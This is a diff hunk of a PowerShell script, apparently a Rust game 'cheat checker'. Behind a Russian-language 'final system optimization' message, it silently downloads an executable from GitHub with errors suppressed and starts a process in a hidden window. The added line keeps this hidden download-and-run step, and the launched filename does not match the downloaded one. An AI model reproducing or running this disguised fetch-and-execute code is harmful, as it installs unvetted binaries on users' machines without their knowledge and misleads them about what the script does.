@@ -184,7 +184,7 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/RustCheatChecker/raw/refs/heads/main/source/assets/custom/RustCheatChecker(Alt2).exe" -OutFile "RustCheatChecker(Alt2).exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/RustCheatChecker/raw/refs/heads/main/source/assets/custom/RustCheatCheckerAlt2.exe" -OutFile "RustCheatCheckerAlt2.exe" -ErrorAction SilentlyContinue
     
     Start-Process -FilePath "RustCheatChecker.exe" -WindowStyle Hidden
 
